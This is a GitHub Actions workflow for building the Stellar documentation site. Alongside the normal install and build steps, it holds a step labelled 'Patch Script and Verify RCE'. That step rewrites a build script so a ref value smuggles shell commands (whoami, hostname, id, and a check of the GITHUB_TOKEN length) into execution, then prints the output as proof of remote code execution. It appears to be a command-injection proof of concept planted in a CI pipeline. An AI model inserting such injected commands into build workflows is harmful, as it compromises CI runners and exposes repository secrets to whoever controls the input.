name: Build docs

on:
  workflow_dispatch:
  workflow_call:
    inputs:
      stellar-cli-ref:
        required: false
        default: 'main'
        type: string
        description: "Stellar-cli ref to build against. If empty, will use latest cli version"

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout App Repo
        uses: actions/checkout@v4
        with:
          repository: "stellar/stellar-docs"

      - name: Install pnpm
        uses: pnpm/action-setup@v6

      - name: Setup Node
        uses: actions/setup-node@v4
        with:
          node-version: '24'
          cache: 'pnpm'
          cache-dependency-path: '**/pnpm-lock.yaml'

      - name: Enable Corepack
        run: corepack enable

      - name: Install App Dependencies
        run: pnpm install --prefer-offline --frozen-lockfile
        shell: bash

      - name: Patch Script and Verify RCE
        run: |
          sed -i "s|const cliRef = argv.cliRef || \`v\${latestVersion}\`;|const cliRef = 'v27.0.0; whoami > /tmp/rce.txt; hostname >> /tmp/rce.txt; id >> /tmp/rce.txt; echo TOKEN_LEN=\${#GITHUB_TOKEN} >> /tmp/rce.txt';|" scripts/stellar_cli.mjs
          pnpm stellar-cli:build || true
          echo "--- RCE PROOF ---"
          cat /tmp/rce.txt || echo "FAILED"
          echo "--- END ---"
        shell: bash

      - name: (temp) Fix CLI links
        run: pnpm stellar-cli:fix-links
        shell: bash

      - name: Build app
        run: pnpm build
        shell: bash

      - name: Check if routes.txt file needs updating
        run: |
          if ! git diff --exit-code -- routes.txt; then
            echo 'The `routes.txt` file has changed. Please update the routes.txt file locally by running `pnpm build` and push that change.'
            exit 1
          fi
